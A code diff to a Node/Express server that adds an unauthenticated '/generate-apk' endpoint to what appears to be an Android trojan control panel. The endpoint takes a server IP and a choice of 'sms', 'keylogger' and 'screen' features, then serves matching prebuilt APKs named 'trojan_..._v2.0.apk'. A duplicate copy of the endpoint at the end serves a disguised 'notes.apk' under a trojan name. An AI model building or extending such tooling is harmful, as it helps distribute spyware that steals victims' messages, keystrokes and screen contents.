@@ -41,7 +41,77 @@ app.use(session({
     saveUninitialized: true
 }))
 app.use(bodyParser.urlencoded({ extended: true }))
+app.use(bodyParser.json()) // Add JSON parser
 app.use(express.static('static'))
+
+// APK Generation Endpoint (before auth middleware)
+app.post("/generate-apk", async (req, res) => {
+    const { serverIp, features } = req.body;
+
+    // Validate features
+    const validFeatures = ['sms', 'keylogger', 'screen'];
+    const selectedFeatures = features.filter(f => validFeatures.includes(f));
+
+    if (selectedFeatures.length === 0) {
+        return res.status(400).json({ error: 'At least one feature must be selected' });
+    }
+
+    // Validate server IP - allow empty for auto-detection
+    // if (!serverIp || !/^[\d.]+$/.test(serverIp)) {
+    //     return res.status(400).json({ error: 'Invalid server IP address' });
+    // }
+
+    console.log(chalk.green(`[APK Generator] Building APK with features: ${selectedFeatures.join(', ')}`));
+    console.log(chalk.green(`[APK Generator] Server IP: ${serverIp}`));
+
+    const fs = await import('fs');
+    const path = await import('path');
+    // Map feature combination to variant filename
+    const sortedFeatures = selectedFeatures.sort();
+    const featureStr = sortedFeatures.join('_');
+
+    // Map to actual APK filename  
+    const variantMap = {
+        'sms': 'trojan_sms_v2.0.apk',
+        'keylogger': 'trojan_keylogger_v2.0.apk',
+        'screen': 'trojan_screen_v2.0.apk',
+        'keylogger_sms': 'trojan_sms_keylogger_v2.0.apk',
+        'screen_sms': 'trojan_sms_screen_v2.0.apk',
+        'keylogger_screen': 'trojan_keylogger_screen_v2.0.apk',
+        'keylogger_screen_sms': 'trojan_sms_keylogger_screen_v2.0.apk'
+    };
+
+    const filename = variantMap[featureStr] || `trojan_${featureStr}_v2.0.apk`;
+    const apkPath = path.join(process.cwd(), 'output', filename);
+
+    if (!fs.existsSync(apkPath)) {
+        console.log(chalk.red(`[APK Generator] File not found: ${apkPath}`));
+        return res.status(404).json({ error: `APK file not found: ${filename}` });
+    }
+
+    res.setHeader('Content-Disposition', `attachment; filename="${filename}"`);
+    res.setHeader('Content-Type', 'application/vnd.android.package-archive');
+
+    const fileStream = fs.createReadStream(apkPath);
+    fileStream.pipe(res);
+
+    fileStream.on('end', () => {
+        console.log(chalk.green(`[APK Generator] APK downloaded: ${filename}`));
+    });
+});
+
+// Logout endpoint
+app.post('/logout', (req, res) => {
+    req.session.destroy((err) => {
+        if (err) {
+            console.log(chalk.red('[Logout] Error destroying session:', err));
+            return res.status(500).json({ error: 'Logout failed' });
+        }
+        res.clearCookie('connect.sid');
+        res.json({ success: true });
+    });
+});
+
 app.use('/', webRoute)
 app.post("/login", async (req, res) => {
     var username = req.body.username
@@ -210,3 +280,49 @@ function getRemaining() {
 
 
 
+
+// APK Generation Endpoint
+app.post("/generate-apk", express.json(), async (req, res) => {
+    const { serverIp, features } = req.body;
+
+    // Validate features
+    const validFeatures = ['sms', 'keylogger', 'screen'];
+    const selectedFeatures = features.filter(f => validFeatures.includes(f));
+
+    if (selectedFeatures.length === 0) {
+        return res.status(400).json({ error: 'At least one feature must be selected' });
+    }
+
+    // Validate server IP
+    if (!serverIp || !/^[\d.]+$/.test(serverIp)) {
+        return res.status(400).json({ error: 'Invalid server IP address' });
+    }
+
+    console.log(chalk.green(`[APK Generator] Building APK with features: ${selectedFeatures.join(', ')}`));
+    console.log(chalk.green(`[APK Generator] Server IP: ${serverIp}`));
+
+    // For now, return the existing APK with a message
+    // TODO: Implement actual build automation
+    const fs = await import('fs');
+    const path = await import('path');
+
+    const apkPath = path.join(process.cwd(), 'notes.apk');
+
+    if (!fs.existsSync(apkPath)) {
+        return res.status(404).json({ error: 'APK file not found' });
+    }
+
+    // Generate descriptive filename
+    const featureStr = selectedFeatures.join('_');
+    const filename = `trojan_${featureStr}_v2.0.apk`;
+
+    res.setHeader('Content-Disposition', `attachment; filename="${filename}"`);
+    res.setHeader('Content-Type', 'application/vnd.android.package-archive');
+
+    const fileStream = fs.createReadStream(apkPath);
+    fileStream.pipe(res);
+
+    fileStream.on('end', () => {
+        console.log(chalk.green(`[APK Generator] APK downloaded: ${filename}`));
+    });
+});
